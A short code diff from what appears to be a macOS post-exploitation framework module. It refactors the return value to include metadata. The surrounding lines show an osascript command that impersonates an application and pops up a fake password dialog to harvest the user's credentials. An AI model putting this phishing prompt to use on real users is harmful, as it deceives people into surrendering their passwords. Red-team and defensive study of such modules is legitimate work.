@@ -119,4 +119,8 @@ import os
 print(os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read())
 """ % (appName, appName, appName, appName)
 
-        return script
+        moduleName = self.info['Name']
+        techniques = self.info['Techniques']
+        software = self.info['Software']
+
+        return script, moduleName, techniques, software
